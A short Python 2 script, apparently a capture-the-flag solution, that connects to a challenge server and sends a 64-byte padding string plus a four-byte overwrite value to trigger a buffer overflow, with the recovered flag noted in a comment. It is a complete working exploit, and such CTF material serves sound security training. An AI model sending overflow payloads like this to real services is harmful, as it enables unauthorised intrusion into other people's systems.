#urg their nc is broken af

import socket

HOST = "104.236.80.67"
PORT = 5681
payload = "A"*64 + "\x37\x13\x37\x13"

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.sendall(payload + "\n")
    print sock.recv(1024)
    sock.close()

main()

# Flag: buffer_overflows_are_pretty_bad
